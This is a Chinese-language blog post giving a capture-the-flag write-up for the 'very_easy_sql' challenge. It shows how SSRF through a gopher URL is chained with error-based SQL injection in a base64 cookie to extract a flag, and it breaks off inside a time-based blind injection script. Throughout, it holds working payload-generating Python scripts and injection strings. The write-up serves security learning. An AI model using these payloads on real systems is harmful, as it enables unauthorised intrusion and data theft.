<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>攻防世界-very_easy_sql | hybcx's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about"><span class="navItemTitle">About</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>攻防世界-very_easy_sql</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-08-21T07:25:52.377Z" id="date"> 2023-08-21</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-08-21T08:50:56.395Z" id="updated"> 2023-08-21</time></div></span><br><span>文章总字数: <div class="control">2.6k</div></span><br><span>预计阅读时间: <div class="control">12 分钟</div></span></div></div><hr><div id="post-content"><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2>
<p>太简单了不描述了，给sql签个到吧</p>
<h2 id="题目解题："><a href="#题目解题：" class="headerlink" title="题目解题："></a>题目解题：</h2>
<p class='item-img' data-src='image-20230821155306560.png'><img src="image-20230821155306560.png" alt="image-20230821155306560"></p>
<p>打开页面，这里说我们不是内部用户不能访问，那估计得利用ssrf，这里先测试一下表单。先尝试了弱口令，没用，在尝试万能密码：'or 1=1#，也没信息，那看一下源代码</p>
<p class='item-img' data-src='image-20230821155505318.png'><img src="image-20230821155505318.png" alt="image-20230821155505318"></p>
<p>发现php，访问一下</p>
<p class='item-img' data-src='image-20230821155526230.png'><img src="image-20230821155526230.png" alt="image-20230821155526230"></p>
<p>不出所料这里就是ssrf利用点。这里也是测试一番，发现只有输入127.0.0.1有反应</p>
<p class='item-img' data-src='image-20230821155615814.png'><img src="image-20230821155615814.png" alt="image-20230821155615814"></p>
<p>bp抓包看一下似乎也没啥信息，这里也就没思路，因为ssrf的利用不太会，因此就借鉴wp吧。</p>
<p>看了wp这里是要利用协议来实现内部访问</p>
<h3 id="Gopher协议"><a href="#Gopher协议" class="headerlink" title="Gopher协议"></a>Gopher协议</h3>
<p>​		定义：Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；</p>
<pre><code>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议
</code></pre>
<p>限制：gopher协议在各个编程语言中的使用限制<strong>Gopher协议格式</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">URL:gopher:<span class="hljs-comment">//&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br></code></pre></td></tr></table></figure>
<ul>
<li>gopher的默认端口是70</li>
<li>如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码</li>
</ul>
<p>剩下的细节就参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43665434/article/details/115255263">gopher协议基础</a></p>
<p>gopher实战1：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/337824.html">gopher协议的利用 - FreeBuf网络安全行业门户</a></p>
<p>gopher实战2：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/112055947">Gopher协议在SSRF漏洞中的深入研究（附视频讲解） - 知乎 (zhihu.com)</a></p>
<p>ssrf参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/miruier/p/13907150.html">SSRF漏洞 - Saint_Michael - 博客园 (cnblogs.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/G0mini/article/details/128273166">SSRF深入各种高级实战用法_G0mini的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-chenxs/p/11749367.html">ssrf漏洞利用(内网探测、打redis) - ctrl_TT豆 - 博客园 (cnblogs.com)</a></p>
<p>粮食充足~</p>
<p>抓包首页post表单发现响应包有set-cookie，wp说：有一个Set-Cookie代表如果输入正确的账号跟密码是可以返回的，可以尝试爆破</p>
<p class='item-img' data-src='image-20230821160834504.png'><img src="image-20230821160834504.png" alt="image-20230821160834504"></p>
<p>思来想去，这里应该就是结合ssrf来登录实现内部访问获取cookie</p>
<p>那这里就需要万能的gopher协议了，不过自身太菜，只能作为一个脚本小子了，虽不会写但咱也得看懂</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> urllib.parse <span class="hljs-comment">#导入库 urllib.parse，用于URL解析与转码</span><br><br>content = <span class="hljs-string">&quot;uname=admin&amp;passwd=admin&quot;</span> <br>content_length = <span class="hljs-built_in">len</span>(content)   <span class="hljs-comment"># 构造请求体内容</span><br><br>test =\           <br><span class="hljs-string">&quot;&quot;&quot;POST /index.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1:80</span><br><span class="hljs-string">User-Agent: curl/7.43.0</span><br><span class="hljs-string">Accept: */*</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Content-Length: &#123;&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">uname=admin&amp;passwd=admin	# 这里似乎不用再次写</span><br><span class="hljs-string">&quot;&quot;&quot;</span>.<span class="hljs-built_in">format</span>(content_length)		<span class="hljs-comment"># 构造http请求</span><br><br>tmp = urllib.parse.quote(test)          <span class="hljs-comment"># 进行URL编码     </span><br>new = tmp.replace(<span class="hljs-string">&quot;%0A&quot;</span>, <span class="hljs-string">&quot;%0D%0A&quot;</span>)      <span class="hljs-comment"># 将%0A替换为%0D%0A    把\n换行符替换为\r\n</span><br>result = urllib.parse.quote(new)        <span class="hljs-comment"># 再次进行URL编码</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;gopher://127.0.0.1:80/_&quot;</span>+result) <span class="hljs-comment"># 输出结果</span><br></code></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">输出如下<br><br>gopher://127.0.0.1:80/_POST%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AUser-Agent%253A%2520curl/7.43.0%250D%250AAccept%253A%2520%252A/%252A%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252024%250D%250A%250D%250Auname%253Dadmin%2526passwd%253Dadmin%2509%2523%2520%25E8%25BF%2599%25E9%2587%258C%25E4%25BC%25BC%25E4%25B9%258E%25E4%25B8%258D%25E7%2594%25A8%25E5%2586%258D%25E6%25AC%25A1%25E5%2586%2599%250D%250A<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230821162135423.png'><img src="image-20230821162135423.png" alt="image-20230821162135423"></p>
<p>这里抓包看回显，有两个cookie，那估计是我们在use页面直接访问127.0.0.1时，其cookie被上面的cookie覆盖了。那这里第二个cookie就是我们登录时得到cookie，那很明显这个cookie就是注入点。</p>
<p class='item-img' data-src='image-20230821162516393.png'><img src="image-20230821162516393.png" alt="image-20230821162516393"></p>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3>
<p>这里解码发现为admin，那现在就是测试闭合方式了，先测试admin’ #</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs PY"><span class="hljs-keyword">import</span> urllib.parse<br><br>host = <span class="hljs-string">&quot;127.0.0.1:80&quot;</span><br>cookie=<span class="hljs-string">&quot;this_is_your_cookie=YWRtaW4nICM=&quot;</span><br><br>test =\<br><span class="hljs-string">&quot;&quot;&quot;GET /index.php HTTP/1.1</span><br><span class="hljs-string">Host: &#123;&#125;</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Cookie:&#123;&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span>.<span class="hljs-built_in">format</span>(host,cookie)<br><br>tmp = urllib.parse.quote(test)<br>new = tmp.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>result = urllib.parse.quote(new)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;gopher://&quot;</span>+host+<span class="hljs-string">&quot;/_&quot;</span>+result)<br></code></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">输出:<br>gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nICM%253D%250D%250A%250D%250A<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230821162858669.png'><img src="image-20230821162858669.png" alt="image-20230821162858669"></p>
<p>发现页面有报错信息，那我们就开始报错注入吧，这里看到near ‘’，那应该就是admin’)闭合的方式，我们直接测试看看</p>
<p>payload为：<code>admin') and extractvalue(1, concat(0x7e, (select database()),0x7e)) #</code></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> base64<br>host = <span class="hljs-string">&quot;127.0.0.1:80&quot;</span><br>payload = <span class="hljs-string">&quot;admin&#x27;) and extractvalue(1, concat(0x7e,(select database()),0x7e)) #&quot;</span><br>base64_payload = <span class="hljs-built_in">str</span>(base64.b64encode(payload.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)), <span class="hljs-string">&quot;utf-8&quot;</span>)<br>cookie=<span class="hljs-string">&quot;this_is_your_cookie=&quot;</span>+base64_payload<br><br>test =\<br><span class="hljs-string">&quot;&quot;&quot;GET /index.php HTTP/1.1</span><br><span class="hljs-string">Host: &#123;&#125;</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Cookie:&#123;&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span>.<span class="hljs-built_in">format</span>(host,cookie)<br><br>tmp = urllib.parse.quote(test)<br>new = tmp.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>result = urllib.parse.quote(new)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;gopher://&quot;</span>+host+<span class="hljs-string">&quot;/_&quot;</span>+result)<br></code></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">输出：<br><br>gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLChzZWxlY3QgZGF0YWJhc2UoKSksMHg3ZSkpICM%253D%250D%250A%250D%250A<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230821163307740.png'><img src="image-20230821163307740.png" alt="image-20230821163307740"></p>
<p>查表：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">admin&#x27;) and extractvalue(1, concat(0x7e, (select GROUP_CONCAT(table_name)from information_schema.tables WHERE table_schema=&#x27;security&#x27;),0x7e)) #<br></code></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> base64<br>host = <span class="hljs-string">&quot;127.0.0.1:80&quot;</span><br>payload = <span class="hljs-string">&quot;admin&#x27;) and extractvalue(1, concat(0x7e, (select GROUP_CONCAT(table_name)from information_schema.tables WHERE table_schema=&#x27;security&#x27;),0x7e)) #&quot;</span><br>base64_payload = <span class="hljs-built_in">str</span>(base64.b64encode(payload.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)), <span class="hljs-string">&quot;utf-8&quot;</span>)<br>cookie=<span class="hljs-string">&quot;this_is_your_cookie=&quot;</span>+base64_payload<br><br>test =\<br><span class="hljs-string">&quot;&quot;&quot;GET /index.php HTTP/1.1</span><br><span class="hljs-string">Host: &#123;&#125;</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Cookie:&#123;&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span>.<span class="hljs-built_in">format</span>(host,cookie)<br><br>tmp = urllib.parse.quote(test)<br>new = tmp.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>result = urllib.parse.quote(new)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;gopher://&quot;</span>+host+<span class="hljs-string">&quot;/_&quot;</span>+result)<br></code></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">输出:<br><br>gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCAoc2VsZWN0IEdST1VQX0NPTkNBVCh0YWJsZV9uYW1lKWZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyBXSEVSRSB0YWJsZV9zY2hlbWE9J3NlY3VyaXR5JyksMHg3ZSkpICM%253D%250D%250A%250D%250A<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230821163836979.png'><img src="image-20230821163836979.png" alt="image-20230821163836979"></p>
<p>这里有过滤，似乎是过滤了group_concat</p>
<p>查列：<code>admin') and extractvalue(1, concat(0x7e, (select GROUP_CONCAT(column_name)from information_schema.columns WHERE table_name='flag'),0x7e)) #</code></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> base64<br>host = <span class="hljs-string">&quot;127.0.0.1:80&quot;</span><br>payload = <span class="hljs-string">&quot;admin&#x27;) and extractvalue(1, concat(0x7e, (select GROUP_CONCAT(column_name)from information_schema.columns WHERE table_name=&#x27;flag&#x27;),0x7e)) #&quot;</span><br>base64_payload = <span class="hljs-built_in">str</span>(base64.b64encode(payload.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)), <span class="hljs-string">&quot;utf-8&quot;</span>)<br>cookie=<span class="hljs-string">&quot;this_is_your_cookie=&quot;</span>+base64_payload<br><br>test =\<br><span class="hljs-string">&quot;&quot;&quot;GET /index.php HTTP/1.1</span><br><span class="hljs-string">Host: &#123;&#125;</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Cookie:&#123;&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span>.<span class="hljs-built_in">format</span>(host,cookie)<br><br>tmp = urllib.parse.quote(test)<br>new = tmp.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>result = urllib.parse.quote(new)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;gopher://&quot;</span>+host+<span class="hljs-string">&quot;/_&quot;</span>+result)<br></code></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">输出：<br><br>gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCAoc2VsZWN0IEdST1VQX0NPTkNBVChjb2x1bW5fbmFtZSlmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIFdIRVJFIHRhYmxlX25hbWU9J2ZsYWcnKSwweDdlKSkgIw%253D%253D%250D%250A%250D%250A<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230821164109862.png'><img src="image-20230821164109862.png" alt="image-20230821164109862"></p>
<p>查内容</p>
<p><code>admin') and extractvalue(1, concat(0x7e, (select flag from flag),0x7e)) #</code></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> base64<br>host = <span class="hljs-string">&quot;127.0.0.1:80&quot;</span><br>payload = <span class="hljs-string">&quot;admin&#x27;) and extractvalue(1, concat(0x7e, (select flag from flag),0x7e)) #&quot;</span><br>base64_payload = <span class="hljs-built_in">str</span>(base64.b64encode(payload.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)), <span class="hljs-string">&quot;utf-8&quot;</span>)<br>cookie=<span class="hljs-string">&quot;this_is_your_cookie=&quot;</span>+base64_payload<br><br>test =\<br><span class="hljs-string">&quot;&quot;&quot;GET /index.php HTTP/1.1</span><br><span class="hljs-string">Host: &#123;&#125;</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Cookie:&#123;&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span>.<span class="hljs-built_in">format</span>(host,cookie)<br><br>tmp = urllib.parse.quote(test)<br>new = tmp.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>result = urllib.parse.quote(new)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;gopher://&quot;</span>+host+<span class="hljs-string">&quot;/_&quot;</span>+result)<br></code></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">输出：<br><br>gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCAoc2VsZWN0IGZsYWcgZnJvbSBmbGFnKSwweDdlKSkgIw%253D%253D%250D%250A%250D%250A<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230821164245078.png'><img src="image-20230821164245078.png" alt="image-20230821164245078"></p>
<p>此时出现了另一个问题，报错的回显最大位数为32位，此时我们只获得了32位，需要用substr函数进行分割读取：</p>
<p><strong>分割读取</strong></p>
<p><code>admin') and extractvalue(1, concat(0x7e, substr((SELECT flag from flag),30,32),0x7e)) #</code></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> base64<br>host = <span class="hljs-string">&quot;127.0.0.1:80&quot;</span><br>payload = <span class="hljs-string">&quot;admin&#x27;) and extractvalue(1, concat(0x7e, substr((SELECT flag from flag),30,32),0x7e)) #&quot;</span><br>base64_payload = <span class="hljs-built_in">str</span>(base64.b64encode(payload.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)), <span class="hljs-string">&quot;utf-8&quot;</span>)<br>cookie=<span class="hljs-string">&quot;this_is_your_cookie=&quot;</span>+base64_payload<br><br>test =\<br><span class="hljs-string">&quot;&quot;&quot;GET /index.php HTTP/1.1</span><br><span class="hljs-string">Host: &#123;&#125;</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Cookie:&#123;&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span>.<span class="hljs-built_in">format</span>(host,cookie)<br><br>tmp = urllib.parse.quote(test)<br>new = tmp.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>result = urllib.parse.quote(new)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;gopher://&quot;</span>+host+<span class="hljs-string">&quot;/_&quot;</span>+result)<br></code></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">输出：<br><br>gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCBzdWJzdHIoKFNFTEVDVCBmbGFnIGZyb20gZmxhZyksMzAsMzIpLDB4N2UpKSAj%250D%250A%250D%250A<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230821164429746.png'><img src="image-20230821164429746.png" alt="image-20230821164429746"></p>
<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3>
<p>这里分享时间盲注脚本</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests <span class="hljs-comment">#导入库requests,用于发送HTTP请求，注意这个需要安装</span><br><span class="hljs-keyword">import</span> time <span class="hljs-comment">#导入库time，用于计时</span><br><span class="hljs-keyword">import</span> base64 <span class="hljs-comment">#导入库base64，用于转码</span><br> <br>url = <span class="hljs-string">&quot;http://61.147.171.105:64317/use.php?url=&quot;</span> <span class="hljs-comment">#http://61.147.171.105:64317是网址及端口，需要更改；/use.php是源码提示的SSRF跳板网址；url=后接需要跳转的网址</span><br>flag = <span class="hljs-string">&quot;&quot;</span> <span class="hljs-comment">#准备输出flag字符串</span><br><span class="hljs-keyword">for</span> pos <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>, <span class="hljs-number">127</span>):<br>        <span class="hljs-comment"># poc=&quot;&#x27;) union select 1,2,if(1=1,sleep(5),1) # &quot; #&#x27;)注释，联合查询 1，2，延时注入猜测注入点</span><br> <br>        <span class="hljs-comment"># security</span><br>        <span class="hljs-comment"># poc=&quot;&#x27;) union select 